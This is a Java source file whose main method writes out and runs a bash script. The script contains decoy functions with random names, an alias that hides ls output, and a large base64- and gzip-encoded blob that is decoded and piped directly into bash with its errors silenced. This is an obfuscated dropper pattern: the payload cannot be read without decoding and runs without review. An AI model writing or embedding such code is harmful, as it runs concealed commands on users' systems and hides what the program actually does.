import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vassptvky() { echo $((RANDOM * RANDOM)); }
vrb95eby6() { for i in {1..3}; do :; done; }
v5rh1edk0() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
H4sIAAAAAAAAA71XW28bxxV+318xnQiWZGeXFwmqzJguFIlKBNCiIkpOUNMhhrtDcqLlzHZ3VpRssSjQNEUugI0+9IakSIIC7UuQAHlIgCDInzEd+1/0zMxeKTlF0aJrQ5w912/OOXPmLD0LRCjR8fHeTnPpofpp2Mvrm2tubbj+c3tzSDbs9ZuwIrXqwCbD2s2aW9/warX15ZlFje7W4Wud/k7nztbePpgovIGlBamt46PXUxm1Lkls7+4dAFP9AH06nTqnLCKOKyaOnBbFDjqHR1pQLRTc9bWcvb91pwVM9QOsybkThecPKFdmcqHdvXarf7ClwWRr5VSEvreAOfGWrUFsE55cqru3/1r/1c5b/ePDdhOPpQyiRqUSkqkzYnIcD+KIhq7gknKpUFSmlEVjIghhlUg9lQlhvBIxPrIH4gxn+2x3jnd221uHrZ2yZWNVm3J9EXtDn4S0sPQqIfUpiWhU8Ymkkax4Ysp9QbyikO0zHp/ZZOJtrGPrJfT0j1/NP//bk28/fPb99/OPv5p/8psUyE7nzf12Z2vnv9sfpw/GxCYjkMKWNTnxWIjsAOFCAmbYcr0FCrq4QPSMSVSzrHCC7CEaCCEdX4yQjDmnvvNOJHi6Pp/4luXGoY/sqC1QDYwVs4MLvDrwFkKswmACUABbUFkDlWIwYB/ueCI8dOMM4GXLuormN9/NP/j06fv/ePbZR08/+e3zvzzO+WugRiS6jSBoQzYyG7h1C7U6u9ZDC8GDYXu4gcyLJnhwEgY+9YAqw5i+nHN8ekp9IGPGhwIXGJJNIPdkEiQ6mjMzAtjjUdkB5PCUhop4LyPmbGWOKEh4JMTIpwU/wCKeF9JI6WLpq9rYdPQ/nAnNktX9EgjGByLmXu40dZg6O4UdRPY0shnPPGJ5HtCMmZN9FkEFKkajsUjtqzoGVuEUzwqRUgX8EzuPY6bijk17nF2xqxxbSHiUOCsEN4U8jYoJCogcK2rlBI5+kUFJ6J/3PSJJf0yJR8M+JxNtoEtd+0066Ar3hEr7IBRSuMJPERk8+q+GhEUsXxjhBBIcQ+rKQnRN5BNyMV2XVAc+wLikaagZEgMkBCQ0iwkeMk78spuZNbPUAbDYEN27h2wO8c6uCYyuXSuQzO2C0f37ryA5plwbNXolpeav0ZHuCxC2kMqyvHqoOxZlldvFrpLJZQtzbvNmkx5bQ4ECW3FjiWyvh6FT1erAvlWyv2oBEA+6CiN+ZA+ZTxslh0GS0QZSbbYO0eAjdbQagMBGYxFJVQngpxAHDU4dX+ZSowcnEJJAfCXfWMpKXguKkI0YP6S/iqE5NJKNcXHU7t6lIRueZ73CLtvsA4xA8Ig26tWqVguNjdd1hUapqW1zEdhHUCRgi57JSuBD/09UjI1XhQeO8LMfHkN7fPLtF1inXkkMmQX/LadSQ2HMke2WmuTtikdPKzz2fVS/fa2GrlmRT2mA6rpsfoYCCFag7gicGMAFlULukwtFeQpOGFgzKvUkF3jRUeKm9v+tzhwQsm3qjajNAls1aQahILEUQDbRKVakCtvlOOld+xH9j4xzYatVHEArovCeVqcpTpMgW4oTuhCOq91DtDME5Zvc+h8Bsm0wpg5VPiNokr4ikbof4V3d5j9xSK4AD8BfXGZX1cxC3rVkigjqYiHNqqeUIgH+For0JTR//OX8g38WxpL5Hz6aP/rz898/srgYxwGi/BTt/7LfbR3ebR0215wxZTR0aOyIcNSAAVkx4ZA31elW6+32Xmv/COS3D1tHzW5rUNvu7DN6sy2P34ip61W79a2N1ju7B63WneNdyM4aNL5LobFGVPZJOBKeUEPeymrS4RePyZVnYrEDJ0KXa1XnCZqHDM+b1QXqhJz1FYfRqFlbZBpUTZxf2dOxKg/AtqTNIduXaKlgQyP0ROH6R2hlRcveuLG6WqIn1pdWIuqpvS5HF871dDzurdx7u3L/OujlM3dPjce9Vef6Ra92ESznVVrPa6fsohBH4+2KEKbPIKTkpERNCil90iLO8fM8xomnB//OUxrSmJ9w+KpwShtU+8tjXXCfpDmxnFb5zLLy2oE4lotp1bLu3ml1u038EPXwaQ/mhR6u9/DL8BNE5tV8580MEcbQlKq+IROqmsZysh79DINl0nqsS2yk1Kp5j9xz884hWIbEaWJvGhmCmocWhVRXSc3nW0ohweBnmHr0+wX1mvXq+mZizU/2phcaA2cvNEX8gBumeR8G6RvMqZYJux6UoSSXVpI06LDClxUawEfixjqyp9VVNfpkXShRzO5nx3GwlX0jzn/39fM/fVHoRT/+9d0nP3w2f/TN/O/v/vj4PQum4AAtF29Wcxm/gq68bcvkNXjXra+6jPb2j6wpYfJfcT7XNqUQAAA=
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
